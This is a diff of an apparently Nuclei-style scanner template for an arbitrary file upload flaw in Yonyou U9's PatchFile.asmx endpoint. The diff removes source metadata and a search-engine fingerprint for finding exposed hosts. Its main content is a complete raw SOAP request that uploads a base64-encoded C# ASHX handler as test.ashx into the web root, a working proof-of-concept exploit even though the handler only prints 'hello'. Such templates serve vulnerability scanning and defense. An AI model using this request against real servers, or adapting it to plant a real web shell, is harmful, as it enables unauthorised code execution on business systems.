@@ -3,14 +3,8 @@ info:
   name: 用友U9patchfile存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/43d3ea246c3d880d4827712be7fcdc0c
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 43d3ea246c3d880d4827712be7fcdc0c
-    fofa: + Hunter：`web.body="logo-u9.png"`
 http:
 - raw:
   - "POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64)\nContent-Length: 885\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"http://tempuri.org/SaveFile\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n   <SaveFile xmlns=\"http://tempuri.org/\">\n    <binData>PCUgQCB3ZWJoYW5kbGVyIGxhbmd1YWdlPSJDIyIgY2xhc3M9IkF2ZXJhZ2VIYW5kbGVyIiAlPiAKdXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLldlYjsgCgpwdWJsaWMgY2xhc3MgQXZlcmFnZUhhbmRsZXIgOiBJSHR0cEhhbmRsZXIgCnsgCiAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlIAogICAgeyAKICAgICAgICBnZXQgewogICAgICAgICAgICAgcmV0dXJuIHRydWU7IAogICAgICAgICAgICB9IAogICAgICAgIH0gCiAgICAgICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QoSHR0cENvbnRleHQgY3R4KSAKICAgICAgICB7IAogICAgICAgICAgICBjdHguUmVzcG9uc2UuV3JpdGUoImhlbGxvIik7IAogICAgICAgIH0gCiAgICB9</binData>\n\n    <path>./</path>\n\n    <fileName>test.ashx</fileName>\n\n   </SaveFile>\n\n  </soap:Body>\n\n </soap:Envelope>"
